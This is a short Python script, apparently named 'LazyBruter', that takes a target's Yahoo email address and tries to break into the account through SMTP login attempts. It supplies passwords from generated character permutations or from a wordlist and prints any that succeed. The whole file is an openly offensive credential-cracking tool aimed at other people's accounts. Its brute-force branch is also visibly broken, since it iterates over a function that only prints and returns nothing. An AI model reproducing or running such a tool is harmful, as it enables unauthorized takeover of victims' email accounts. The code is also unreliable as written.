import smtplib
import os
import itertools

smtpserver_yahoo = smtplib.SMTP("smtp.mail.yahoo.com",587)
smtpserver_yahoo.ehlo()
smtpserver_yahoo.starttls()

user = input("\nEnter Target's Email Address: ")
method = input("Choose method to attack => (a)Brute Force (b)Dictionary : ")
if method == "a":
    print ("\nYou are about to attack this email: ",user)
    verify2 = input ("Do you want to continue? [y/n]: ")
    if verify2 == "y":
        def print_perms(chars, minlen, maxlen): 
            for n in range(minlen, maxlen+1): 
                for perm in itertools.product(chars, repeat=n): 
                    print(''.join(perm)) 
            
    print_perms ("abcdefghijklmnopqrstuvwxyz1234567890!#$%&'*+-/=?^_`{|}~;", 2, 4)

    for password in print_perms:
        try:
            smtpserver_yahoo.login(user, password)

            print ("[+] Password Cracked: ", password)
            break
        except smtplib.SMTPAuthenticationError:
            print ("[!] Password Inccorect: ", password)
			
    if verify2 == "n":   
        quit()
			
if method == "b":
    passwfile = input("Enter the Wordlist Path: ")
    passwfile = open(passwfile, "r")
    print ("\nYou are about to brute force this email: ",user)
    verify = input ("Do you want to continue: [y/n]: ")

    if verify == "y":
        for password in passwfile:
            try:
                smtpserver_yahoo.login(user, password)
        
                print ("[+] Password Found: ", password)
                break
            except smtplib.SMTPAuthenticationError:
                print ("[!] Trying password: ", password)
                
    if verify == "n":
        print ("Thanks for using LazyBruter!")
        print ("Quiting...")    
        quit()